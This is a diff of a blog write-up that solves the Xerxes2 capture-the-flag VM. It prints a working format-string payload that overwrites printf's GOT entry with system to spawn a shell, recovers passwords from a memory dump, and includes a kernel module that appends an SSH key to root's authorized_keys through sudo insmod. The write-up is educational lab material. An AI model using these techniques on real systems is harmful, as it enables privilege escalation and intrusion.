+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ ulimit -s unlimited
 
 delacroix@xerxes2:~$ ldd /opt/bf
     linux-gate.so.1 =&gt;  (0x4001e000)
@@ -463,7 +455,7 @@ delacroix@xerxes2:~$ ldd /opt/bf
     /lib/ld-linux.so.2 (0x40000000)
 delacroix@xerxes2:~$
 </code></pre></div><p>The memory locations are now static :) With that done, lets have a look at what pointer we would like to override, and then where we should be overwriting it to. We first take a look at the Global Offset Table:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ objdump -R /opt/bf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ objdump -R /opt/bf
 
 /opt/bf:     file format elf32-i386
 
@@ -482,7 +474,7 @@ OFFSET   TYPE              VALUE
 delacroix@xerxes2:~$
 </code></pre></div><p>Here, we will choose to override the <code>printf</code> functions pointer. This is at 0x08049a48. So, this address will have the location of our <em>evil code</em>. But now, how do we know where the evil code is and <em>what</em> is it? Again, this was another interesting thing that had me researching for a very long time. In the end, it came to light that there is such a thing as <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">ret2libc</a>. The basic idea here is that we override the pointer for <code>printf</code> to <code>system</code> with a argument. I highly recommend you read <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">this pdf</a> for a proper explanation on what exactly this means.</p>
 <p>The only thing that is left to determine is where <code>system</code> is in memory. Luckily this is also pretty easy to find out. Fire up <code>gdb</code>, run the binary and <code>print system</code> to get the address:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ gdb -q /opt/bf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ gdb -q /opt/bf
 Reading symbols from /opt/bf...(no debugging symbols found)...done.
 (gdb) run
 Starting program: /opt/bf
@@ -496,7 +488,7 @@ usage: /opt/bf [program]
 <p>We have all the information we need, lets get to work.</p>
 <p>We fire up <code>gdb</code>, and instead of printing the location of <code>AAAA</code>, we provide a memory address, with a <code>%n</code> format string so that we can write the amount of bites needed to override the pointer location.</p>
 <p>To aid in getting the exact amount of padding right, we will set a breakpoint just before the application finished so that we can examine the pointer 0x08049a48 from the GOT:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ gdb -q /opt/bf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ gdb -q /opt/bf
 Reading symbols from /opt/bf...(no debugging symbols found)...done.
 
 (gdb) disass main
@@ -542,10 +534,10 @@ Breakpoint 1, 0x080486eb in main ()
 0x8049a48 &lt;printf@got.plt&gt;: 0x00000004
 (gdb)
 </code></pre></div><p>Oooooooooooh. So basically 0x8049a48 now says <code>printf</code> lives at 0x00000004. Not entirely true though, but we will fix this. Fixing this is quite easy too. Using some python again, we can calculate the amount of bytes we must write to get the memory location we want. We know we want to write to <code>system</code>, that lives in memory at 0x40062000. We will split the calculation up into 2 parts, and first write the 0x2000, and then the 0x4006. We can see that we have written 4 bytes already, so to calculate the first part, we will simply subtract 4 from 0x2000 and pad parameter 16 with the amount.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">(gdb) shell echo <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print 0x2000-0x4&#39;</span><span style="color:#f00">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">(gdb) shell echo <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print 0x2000-0x4&#39;</span><span style="color:#f00">)</span>
 <span style="color:#f60">8188</span> <span style="color:#0f0"># output is a decimal value</span>
 </code></pre></div><p>We now pad the format string as required, re-run the program in <code>gdb</code>, and inspect 0x08049a48 from the GOT</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">(gdb) run <span style="color:#87ceeb">&#34;</span><span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;%8188u%16$n&#34;)])&#39;</span><span style="color:#f00">)</span><span style="color:#87ceeb">#&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">(gdb) run <span style="color:#87ceeb">&#34;</span><span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;%8188u%16$n&#34;)])&#39;</span><span style="color:#f00">)</span><span style="color:#87ceeb">#&#34;</span>
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 
@@ -556,7 +548,7 @@ Breakpoint 1, 0x080486eb in main ()
 0x8049a48 &lt;printf@got.plt&gt;: 0x00002000
 (gdb)
 </code></pre></div><p>You will see some whitespace output as a result of the <code>%8188u</code>, but inspecting the pointer from GOT reveals that we have the lower part of the memory now set correctly (0x00002000)! :) The upper part of the address is calculated in a similar way, however, we are going to be moving on 2 places in memory to write this value and provide another format string. This means that our lower part of the memory will change as a result, and we will need to compensate for that when we calculate the upper part.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">(gdb) run <span style="color:#87ceeb">&#34;</span><span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;\x4a\x9a\x04\x08&#34; + &#34;%8188u%16$n&#34; + &#34;%17$n&#34;)])&#39;</span><span style="color:#f00">)</span><span style="color:#87ceeb">#&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">(gdb) run <span style="color:#87ceeb">&#34;</span><span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;\x4a\x9a\x04\x08&#34; + &#34;%8188u%16$n&#34; + &#34;%17$n&#34;)])&#39;</span><span style="color:#f00">)</span><span style="color:#87ceeb">#&#34;</span>
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 
@@ -567,7 +559,7 @@ Breakpoint 1, 0x080486eb in main ()
 0x8049a48 &lt;printf@got.plt&gt;: 0x20042004
 (gdb)
 </code></pre></div><p>As you can see, we have moved up 4 bytes on the lower part of the address, so we can simply take 4 off 8188 to fix that. To determine the upper part of the address though, we will do another hex calculation and remove the amount that we have from the amount that we want:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">(gdb) shell echo <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print 0x4006-0x2000&#39;</span><span style="color:#f00">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">(gdb) shell echo <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print 0x4006-0x2000&#39;</span><span style="color:#f00">)</span>
 <span style="color:#f60">8198</span> <span style="color:#0f0"># output is a decimal value</span>
 
 (gdb) run <span style="color:#87ceeb">&#34;</span><span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;\x4a\x9a\x04\x08&#34; + &#34;%8184u%16$n&#34; + &#34;%8198u%17$n&#34;)])&#39;</span><span style="color:#f00">)</span><span style="color:#87ceeb">#&#34;</span>
@@ -583,7 +575,7 @@ Breakpoint 1, 0x080486eb in main ()
 </code></pre></div><p>w00t. We have rewritten the GOT for <code>printf</code> to the location of the libc <code>system</code> call using the format string vulnerability. Phew.</p>
 <h3 id="optbf---part5">/opt/bf - part5</h3>
 <p>Now, all that is left is to get the <code>printf</code> to rerun (using the <code>#</code>) with a payload such as <code>/bin/sh</code>. We will append the <code>/bin/sh</code> to the end and just add another <code>#</code> to call <code>printf</code> (which is now overridden):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ /opt/bf <span style="color:#87ceeb">&#34;</span><span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;\x4a\x9a\x04\x08&#34; + &#34;%8184u%16$n&#34; + &#34;%8198u%17$n&#34; + &#34;;/bin/sh&#34;)])&#39;</span><span style="color:#f00">)</span><span style="color:#87ceeb">##&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ /opt/bf <span style="color:#87ceeb">&#34;</span><span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;\x4a\x9a\x04\x08&#34; + &#34;%8184u%16$n&#34; + &#34;%8198u%17$n&#34; + &#34;;/bin/sh&#34;)])&#39;</span><span style="color:#f00">)</span><span style="color:#87ceeb">##&#34;</span>
 H�J�                                                                                                                                                                                                              d
 $ id
 <span style="color:#eedd82">uid</span>=1002(delacroix) <span style="color:#eedd82">gid</span>=1002(delacroix) <span style="color:#eedd82">euid</span>=1001(polito) <span style="color:#eedd82">egid</span>=1001(polito) <span style="color:#eedd82">groups</span>=1001(polito),1002(delacroix)
@@ -593,7 +585,7 @@ $
 <h2 id="becoming-korenchkin">becoming korenchkin</h2>
 <p>We just got a shell with a euid for <code>polito</code>. To make life easier, I copied the public key I generated earlier for the first shell into <code>polito</code>&rsquo;s home, and SSH&rsquo;d in as that user.</p>
 <p>At first glance, it appeared as if we have a gpg encrypted <code>dump</code> and a pdf. There was also a cronjob to start a netcat server piping a text file out via tcp/4444 (remember the mp3 form earlier? :D)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">polito@xerxes2:~$ ls -lh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">polito@xerxes2:~$ ls -lh
 total 43M
 -rw-r--r-- <span style="color:#f60">1</span> polito polito 140K Jul <span style="color:#f60">16</span> 10:57 audio.txt
 -rw-r--r-- <span style="color:#f60">1</span> polito polito  43M Jul <span style="color:#f60">16</span> 12:17 dump.gpg
@@ -607,10 +599,10 @@ polito@xerxes2:~$
 </figure>
 
 <p>That is all the PDF had. The QR code resolves to &ldquo;XERXES is watching&hellip;&rdquo;. I tried to highlight all of the text in the PDF to maybe reveal a piece of text that was white in color, but nothing apparent came out. The next step was to run the PDF through the <code>file</code> utility.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">polito@xerxes2:~$ file -k polito.pdf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">polito@xerxes2:~$ file -k polito.pdf
 polito.pdf: x86 boot sector, code offset 0xe0 DBase <span style="color:#f60">3</span> data file with memo(s) (<span style="color:#f60">1146103071</span> records)
 </code></pre></div><p>&hellip;<em>x86 boot sector</em>&hellip; wait&hellip; <strong>WHAT</strong>?. Ok, so that is interesting. Opening the PDF in a HEX editor revealed 2 PDF headers:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f60">00000000</span>  <span style="color:#f60">83</span> E0 FF EB  1F <span style="color:#f60">25</span> <span style="color:#f60">50</span> <span style="color:#f60">44</span>   <span style="color:#f60">46</span> 2D <span style="color:#f60">31</span> 2E  <span style="color:#f60">35</span> 0A <span style="color:#f60">39</span> <span style="color:#f60">39</span> .....%PDF-1.5.99
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f60">00000000</span>  <span style="color:#f60">83</span> E0 FF EB  1F <span style="color:#f60">25</span> <span style="color:#f60">50</span> <span style="color:#f60">44</span>   <span style="color:#f60">46</span> 2D <span style="color:#f60">31</span> 2E  <span style="color:#f60">35</span> 0A <span style="color:#f60">39</span> <span style="color:#f60">39</span> .....%PDF-1.5.99
 <span style="color:#f60">00000010</span>  <span style="color:#f60">39</span> <span style="color:#f60">20</span> <span style="color:#f60">30</span> <span style="color:#f60">20</span>  6F <span style="color:#f60">62</span> 6A 0A   3C 3C 3E 3E  0A <span style="color:#f60">73</span> <span style="color:#f60">74</span> <span style="color:#f60">72</span> <span style="color:#f60">9</span> <span style="color:#f60">0</span> obj.&lt;&lt;&gt;&gt;.str
 <span style="color:#f60">00000020</span>  <span style="color:#f60">65</span> <span style="color:#f60">61</span> 6D 0A  <span style="color:#f60">68</span> E0 <span style="color:#f60">08</span> <span style="color:#f60">17</span>   BC <span style="color:#f60">00</span> <span style="color:#f60">10</span> <span style="color:#f60">68</span>  C0 <span style="color:#f60">07</span> 1F EB eam.h......h....
 <span style="color:#f60">00000030</span>  <span style="color:#f60">21</span> <span style="color:#f60">59</span> <span style="color:#f60">81</span> F9  4D 5A <span style="color:#f60">74</span> 0C   B4 0E <span style="color:#f60">86</span> C1  CD <span style="color:#f60">10</span> <span style="color:#f60">86</span> C5 !Y..MZt.........
@@ -644,7 +636,7 @@ polito.pdf: x86 boot sector, code offset 0xe0 DBase <span style="color:#f60">3</
 000001F0  <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span>  <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span>   <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span>  <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">55</span> AA ..............U.
 <span style="color:#f60">00000200</span>  <span style="color:#f60">25</span> <span style="color:#f60">50</span> <span style="color:#f60">44</span> <span style="color:#f60">46</span>  2D <span style="color:#f60">31</span> 2E <span style="color:#f60">35</span>   0A <span style="color:#f60">25</span> D0 D4  C5 D8 0A <span style="color:#f60">34</span> %PDF-1.5.%.....4
 </code></pre></div><p>Notice the 2 <code>%PDF-1.5</code>. Assuming this really was a MBR, I decided to strip the first 512 bytes and put that in a new file. Then, the remainder of the bytes to a second file, and test by attempting to open both in a PDF viewer again.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# head -c <span style="color:#f60">512</span> polito.pdf &gt; first
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# head -c <span style="color:#f60">512</span> polito.pdf &gt; first
 root@kali:~# file -k first
 first: x86 boot sector, code offset 0xe0 DBase <span style="color:#f60">3</span> data file with memo(s) (<span style="color:#f60">1146103071</span> records)
 
@@ -658,7 +650,7 @@ root@kali:~#
 </figure>
 
 <p>Running <code>$ qemu first</code>, booted a vm and ran the bootsector code, revealing a password of <em>amFuaWNl</em>. The next part was pretty easy. I assumed this was the password word for the potentially GPG encrypted <code>dump</code> file:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">polito@xerxes2:~$ gpg -d dump.gpg &gt; decrypted_dump
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">polito@xerxes2:~$ gpg -d dump.gpg &gt; decrypted_dump
 gpg: CAST5 encrypted data
 gpg: encrypted with <span style="color:#f60">1</span> passphrase
 gpg: WARNING: message was not integrity protected
@@ -670,14 +662,14 @@ polito@xerxes2:~$ ls -lh decrypted_dump
 -rw-r--r-- <span style="color:#f60">1</span> polito polito 126M Aug <span style="color:#f60">10</span> 02:12 decrypted_dump
 </code></pre></div><p>So we successfully decrypted <code>dump.gpg</code> it seems resulting in a 126M file, however at first glance it appears to just be junk. I paged and paged and paged and paged and paged through <code>less</code> until I saw cleartext that looked like kernel boot messages. The first thought that came to mind after seeing this was &ldquo;Could this be some sort of memory dump?&rdquo;.</p>
 <p>As the kernel messages were interesting, I decided to put the decrypted dump through strings. Eventually after going through even more pages, it seemed like there were even some command history in the dump. Ok, well then I believe its time to look for things that could relate to that file in <code>/opt/backup</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">polito@xerxes2:~$ grep <span style="color:#f00">$(</span>ls /opt/backup/<span style="color:#f00">)</span> decrypted_strings
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">polito@xerxes2:~$ grep <span style="color:#f00">$(</span>ls /opt/backup/<span style="color:#f00">)</span> decrypted_strings
 korenchkin.tar.enc
 openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
 openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
 openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
 polito@xerxes2:~$
 </code></pre></div><p>Heh, ok. Easy enough. <code>korenchkin.tar.enc</code> was encrypted using <code>openssl</code>. We can simply decrypt this with the <code>-d</code> flag. From the dump we were able to get the password used too:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar
 
 polito@xerxes2:~$ file korenchkin.tar
 korenchkin.tar: POSIX tar archive (GNU)
@@ -687,7 +679,7 @@ polito@xerxes2:~$ tar xvf korenchkin.tar
 .ssh/id_rsa.pub
 polito@xerxes2:~$
 </code></pre></div><p>Extracting <code>korenchkin.tar</code> revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as <code>korenchkin</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh -i korenchkin.key korenchkin@192.168.56.102
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh -i korenchkin.key korenchkin@192.168.56.102
 
 Welcome to xerxes2.
       XERXES wishes you
@@ -706,7 +698,7 @@ korenchkin@xerxes2:~$
 </code></pre></div><p><em>You have new mail.</em></p>
 <h2 id="becoming-root">becoming root</h2>
 <p>Again, enumeration is key. As <code>korenchkin</code>, you will see that you may run.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">korenchkin@xerxes2:~$ sudo -l
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">korenchkin@xerxes2:~$ sudo -l
 Matching Defaults entries <span style="color:#f00">for</span> korenchkin on this host:
     env_reset, mail_badpass, <span style="color:#eedd82">secure_path</span>=/usr/local/sbin<span style="color:#87ceeb">\:</span>/usr/local/bin<span style="color:#87ceeb">\:</span>/usr/sbin<span style="color:#87ceeb">\:</span>/usr/bin<span style="color:#87ceeb">\:</span>/sbin<span style="color:#87ceeb">\:</span>/bin
 
@@ -714,7 +706,7 @@ User korenchkin may run the following commands on this host:
     (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
 </code></pre></div><p>So we may run insmod as <code>root</code>. Immediately this hints towards the fact that we will need to write a custom kernel module and maybe spawn a shell? And so, we board another educational school bus ride towards kernel module land.</p>
 <p>I confirmed that the kernel-headers were installed for the current kernel. Googling around got me to a sample &ldquo;Hello World!&rdquo; kernel module. This together with a sample <code>Makefile</code> was working fine. The sources for the files initially tested were:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;linux/module.h&gt;       /* Needed by all modules */</span><span style="color:#e5e5e5">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;linux/module.h&gt;       /* Needed by all modules */</span><span style="color:#e5e5e5">
 </span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;linux/kernel.h&gt;       /* Needed for KERN_INFO */</span><span style="color:#e5e5e5">
 </span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;linux/init.h&gt;         /* Needed for the macros */</span><span style="color:#e5e5e5">
 </span><span style="color:#e5e5e5"></span>
@@ -731,7 +723,7 @@ User korenchkin may run the following commands on this host:
 
 module_init(hello_start);
 module_exit(hello_end);
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-make" data-lang="make"><span style="color:#eedd82">obj-m</span> += hello.o
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-make" data-lang="make"><span style="color:#eedd82">obj-m</span> += hello.o
 
 <span style="color:#ff0">all</span>:
     make -C /lib/modules/<span style="color:#f00">$(</span>shell uname -r<span style="color:#f00">)</span>/build <span style="color:#eedd82">M</span>=<span style="color:#f00">$(</span>PWD<span style="color:#f00">)</span> modules
@@ -739,7 +731,7 @@ module_exit(hello_end);
 <span style="color:#ff0">clean</span>:
     make -C /lib/modules/<span style="color:#f00">$(</span>shell uname -r<span style="color:#f00">)</span>/build <span style="color:#eedd82">M</span>=<span style="color:#f00">$(</span>PWD<span style="color:#f00">)</span> clean
 </code></pre></div><p>I took <code>hello.c</code> and the <code>Makefile</code>, put them into a directory, built the module with <code>make</code>, and loaded it. Once the module loaded I checked the kernel messages via <code>dmesg</code> to confirm it working:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">korenchkin@xerxes2:~/kern$ make
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">korenchkin@xerxes2:~/kern$ make
 make -C /lib/modules/3.2.0-4-686-pae/build <span style="color:#eedd82">M</span>=/home/korenchkin/kern modules
 make[1]: Entering directory <span style="color:#87ceeb">`</span>/usr/src/linux-headers-3.2.0-4-686-pae<span style="color:#87ceeb">&#39;
 </span><span style="color:#87ceeb">  CC [M]  /home/korenchkin/kern/hello.o
@@ -761,7 +753,7 @@ korenchkin@xerxes2:~/kern$
 <p><em>insert loud crash and burn sound here</em></p>
 <p>Turns out, kernel development is pretty anti command execution. Compiling modules that have stuff like <code>stdio.h</code> included will fail with headers not found type errors. One can hack the Makefile to include headers from <code>/usr/include</code>, but it just ends up being a mess. However, there is a handy little function in <code>kmod.h</code> called <code>call_usermodehelper()</code>. From the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html">kernel docs</a>, <code>call_usermodehelper()</code> will <em>prepare and start a usermode application</em>. <strong>That</strong> sounds pretty handy in our case :)</p>
 <p>So, time to rewrite <code>hello.c</code> to be useful! Puzzling the pieces together I found on the internet, <a href="http://stackoverflow.com/questions/7143105/call-usermodehelper-call-usermodehelperpipe-usage">this</a> amongst other pieces of information helped get the ball rolling.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0">#include &lt;linux/module.h&gt;       /* Needed by all modules */</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0">#include &lt;linux/module.h&gt;       /* Needed by all modules */</span>
 <span style="color:#0f0">#include &lt;linux/kernel.h&gt;       /* Needed for KERN_INFO */</span>
 <span style="color:#0f0">#include &lt;linux/init.h&gt;         /* Needed for the macros */</span>
 
@@ -794,7 +786,7 @@ static void __exit hello_end(void)
 module_init(hello_start);
 module_exit(hello_end);
 </code></pre></div><p>As can be seen in the code above, I added a function <code>get_root()</code>, that will append whatever is in <code>/tmp/pubkey</code> to <code>/root/.ssh/authorized_keys</code> using <code>call_usermodehelper</code>. <code>/tmp/pubkey</code> contained the public key of the keypair I generated at the beginning of starting Xerxes2. I modified <code>Makefile</code> to have <code>obj-m += rooted.o</code> this time, <code>make</code>&rsquo;d the source and ran the <code>insmod</code> for the newly build <code>rooted.ko</code>. Then, I inspected the kernel messages again, and attempted to login as root:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">korenchkin@xerxes2:~/kern$ vi rooted.c
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">korenchkin@xerxes2:~/kern$ vi rooted.c
 
 korenchkin@xerxes2:~/kern$ vi Makefile
 
@@ -957,57 +949,47 @@ root@xerxes2:~#
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f" aria-label="Facebook">
       <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&text=Beating%20Xerxes2">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&text=Beating%20Xerxes2" aria-label="Twitter">
       <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2" aria-label="Linkedin">
       <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
